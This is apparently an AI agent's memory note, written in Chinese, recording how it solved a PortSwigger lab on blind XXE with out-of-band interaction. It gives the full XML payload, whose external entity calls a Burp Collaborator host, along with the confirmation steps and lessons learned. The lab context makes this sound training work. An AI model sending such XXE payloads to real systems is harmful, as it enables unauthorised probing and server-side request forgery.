---
metadata:
  node_type: memory
name: "A-arm lab-xxe-with-out-of-band-interaction"
description: "A 臂实录: 盲 XXE OOB 只需 Collaborator 外带实体,stock 端点 400 即证 XML 已解析,交互到达即翻牌"
last_updated: 2026-10-10T01:16:47+08:00
created: 2026-10-10T01:16:47+08:00
---

## lab-xxe-with-out-of-band-interaction (arm A, solved)

路径: /web-security/xxe/blind/lab-xxe-with-out-of-band-interaction (canonical, page_read 直取 lab_id)
实例: 0ab9003f045a595880f3e9a400fa002f, range_launch launch-url --jar /tmp/cj1.json (reused:false)

链:
1. page_read 题面 -> lab_id;range_launch -> instance url
2. http_session get /product?productId=1 -> 表单 action=/product/stock, POST XML
3. burp_collab new --state /tmp/collab1.json -> label aguj2yklz9o7sbtgb213hd634uaky9.oastify.com
4. http_session post /product/stock --header 'Content-Type: application/xml'
   body: <?xml version="1.0"?><!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://<label>.oastify.com"> ]>
         <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
   -> 400 "Invalid product ID"(应用层错误 = XML 已解析,盲面无回显)
5. burp_collab poll -> 3 交互:DNS x2 + HTTP(UA Java/21.0.1)= 解析器外带铁证
6. banner_verdict -> solved:true, congrats line

可复用规则:
- 盲 XXE 判定锚点是 Collaborator 交互本身,不需回显;400 "Invalid product ID" 同时证伪了"XML 未被解析"这一假设。
- 平台防火墙只放 Burp Collaborator 公共服,自建 canary(oob_serve)在本族必败;burp_collab 件一次 new + 一次 poll 即闭环。
- 外带 HTTP 请求的 UA 直接暴露后端解析器(Java 21),顺带指纹。

